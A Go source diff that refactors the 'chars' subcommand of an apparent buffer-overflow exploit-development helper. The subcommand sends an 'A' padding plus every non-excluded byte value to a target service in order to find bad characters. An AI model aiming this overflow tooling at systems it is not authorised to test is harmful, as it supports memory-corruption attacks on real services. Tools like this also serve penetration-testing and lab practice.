@@ -5,38 +5,47 @@ import (
     "net"
 )
 
-// the main functionality of the chars subroutine
-func Chars(host string, port int, offset int, exclude string, pref,
-        suff string) {
+// contains chars subcommand specific parameters
+type Chars struct {
+    offset  int
+    exclude string
+}
+
+// creates a new chars object to store parameters
+func NewChars(offset int, exclude string) Chars {
+    return Chars{ offset, exclude }
+}
+
+// the main functionality of the chars subcommand
+func (c Chars) Run(host Host, tmpl string) {
     // parse exclusions
-    fmt.Println(" > Parsing exclusions.")
-    exclusions, err := parseHex(exclude)
+    fmt.Println(" > parsing exclusions")
+    exclusions, err := parseHex(c.exclude)
     if err != nil {
-        fmt.Println("\n Error! couldn't parse exclude string")
+        fmt.Printf("\n error: %s\n", err)
         return
     }
 
     // generate the overflow
-    pad := generateBytes(0x41, offset + 4)
+    pad := generateBytes(0x41, c.offset + 4)
 
     // generate the byte array of characters to send to the target service
-    fmt.Println(" > Generating characters.")
+    fmt.Println(" > generating characters")
     data := append(pad, generateCharacters(exclusions)...)
 
-    // build payload 
-    fmt.Println(" > Building payload.")
-    payload := createPayload(data, pref, suff)
+    // build payload
+    fmt.Println(" > building payload")
+    payload := Payload{ data, tmpl }
 
     // send payload to target service
-    fmt.Printf(" > Sending %d-byte payload.\n", len(payload))
-    err = sendPayload(host, port, payload)
-    if err != nil {
-        fmt.Printf("\n Error! %s\n", err.(*net.OpError).Err)
+    fmt.Printf(" > sending %d-byte payload\n", payload.Size())
+    if err = host.SendPayload(payload); err != nil {
+        fmt.Printf("\n error: %s\n", err.(*net.OpError).Err)
         return
     }
 
     // notify user that the payload was successfully delivered
-    fmt.Println("\n Success! No errors found.")
+    fmt.Println("\n success: no errors found")
 }
 
 // generates a slice of bytes from 0x00 to 0xFF, excluding specified bytes
@@ -66,3 +75,4 @@ func generateCharacters(exclude []byte) []byte {
 
     return data
 }
+
